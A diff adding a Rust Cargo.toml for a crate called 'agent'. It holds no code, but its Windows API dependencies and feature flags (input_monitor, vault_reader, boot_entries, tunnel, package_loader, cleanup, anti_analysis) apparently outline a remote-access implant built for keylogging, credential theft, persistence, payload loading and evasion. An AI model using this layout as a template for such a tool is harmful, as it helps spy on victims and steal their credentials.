@@ -1,0 +1,49 @@
+[package]
+name = "agent"
+version = "1.0.0"
+edition = "2021"
+
+[dependencies]
+ureq = { version = "2.9", features = ["json", "tls"] }
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+base64 = "0.22"
+aes-gcm = "0.10"
+rand = "0.8"
+uuid = { version = "1", features = ["v4"] }
+chrono = "0.4"
+
+[target.'cfg(windows)'.dependencies]
+winapi = { version = "0.3", features = ["winuser", "processthreadsapi", "tlhelp32", "handleapi", "psapi", "winbase", "fileapi", "synchapi", "winreg", "dpapi", "wincrypt", "wingdi", "winnt", "shlobj", "shellapi", "taskschd", "combaseapi", "objbase", "errhandlingapi", "memoryapi", "securitybaseapi", "iphlpapi", "winsock2"] }
+windows-sys = { version = "0.52", features = ["Win32_System_Threading", "Win32_Foundation", "Win32_Security", "Win32_System_Registry"] }
+
+[target.'cfg(unix)'.dependencies]
+libc = "0.2"
+nix = { version = "0.28", features = ["process", "signal", "fs", "net"] }
+
+[features]
+default = ["all_modules"]
+all_modules = ["terminal", "storage", "task_viewer", "display", "media", "input_monitor", "vault_reader", "config_store", "boot_entries", "service_manager", "tunnel", "package_loader", "cleanup", "network_scan", "clipboard"]
+terminal = []
+storage = []
+task_viewer = []
+display = []
+media = []
+input_monitor = []
+vault_reader = []
+config_store = []
+boot_entries = []
+service_manager = []
+tunnel = []
+package_loader = []
+cleanup = []
+network_scan = []
+clipboard = []
+anti_analysis = []
+
+[profile.release]
+opt-level = "z"
+lto = true
+codegen-units = 1
+panic = "abort"
+strip = true
